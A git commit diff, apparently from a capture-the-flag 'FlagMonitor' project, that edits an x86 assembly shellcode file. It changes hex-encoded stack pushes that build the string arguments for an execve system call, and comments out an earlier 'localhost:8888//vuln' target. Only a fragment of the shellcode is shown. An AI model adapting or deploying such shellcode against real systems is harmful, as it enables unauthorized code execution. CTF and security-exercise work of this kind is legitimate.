25f2b23f93f97c64b32bf4a9801240a1ece9c19f
lhchang <lhchang@asu.edu>
2017-05-01 16:38:04 -0700

    updated shellcode

--- FlagMonitor/shellcode.s
+++ FlagMonitor/shellcode.s
@@ -6,17 +6,17 @@ push   $0xb
 pop    %eax
 cltd   
 push   %edx
-#push   $0x6e6c7576
-#push   $0x2f2f3038
-#push   $0x30383a32
-
-push   $0x6e6c7576
+push   $0x64687373
 push   $0x2f2f3838
-push   $0x38383a74
-push   $0x736f686c
-push   $0x61636f6c
+push   $0x38383a32
 
-#push   $0x6d616574
+#push   $0x6e6c7576
+#push   $0x2f2f3838
+#push   $0x38383a74
+#push   $0x736f686c
+#push   $0x61636f6c
+
+push   $0x6d616574
 mov    %esp,%ecx
 push   %edx
 push   $0x74
